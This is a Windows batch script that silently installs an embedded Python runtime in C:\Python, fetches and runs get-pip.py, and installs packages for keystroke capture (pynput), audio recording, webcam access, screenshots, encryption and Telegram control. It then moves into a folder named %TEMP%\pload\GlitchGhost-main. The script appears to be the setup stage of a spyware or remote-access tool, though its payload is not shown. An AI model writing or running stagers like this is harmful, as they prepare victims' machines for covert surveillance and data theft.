@echo off
REM Change to the directory where the script will be executed
cd /d %TEMP%

REM Download the embeddable Python package
curl -o python-3.9.0-embed-amd64.zip https://www.python.org/ftp/python/3.9.0/python-3.9.0-embed-amd64.zip

REM Extract the downloaded ZIP file to C:\Python
powershell -Command "Expand-Archive -Path 'python-3.9.0-embed-amd64.zip' -DestinationPath 'C:\Python'"

REM Change to the Python directory
cd C:\Python


echo Pip is not installed. Installing pip...
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py

cd C:\Python\lib\site-packages
mkdir pyautogui
curl -L -o "PyAutoGUI-0.9.54.tar.gz" https://files.pythonhosted.org/packages/65/ff/cdae0a8c2118a0de74b6cf4cbcdcaf8fd25857e6c3f205ce4b1794b27814/PyAutoGUI-0.9.54.tar.gz
tar -xf "PyAutoGUI-0.9.54.tar.gz" -C ./
cd PyAutoGUI-0.9.54
xcopy /E /I pyautogui C:\Python\lib\site-packages\pyautogui

cd C:\Python\lib\site-packages
echo Installing requests package...
C:\Python\python C:\Python\Lib\site-packages\pip install requests python-telegram-bot pypiwin32 pycryptodome cryptography pynput sounddevice scipy opencv-python numpy setuptools pillow

cd %TEMP%\pload\GlitchGhost-main
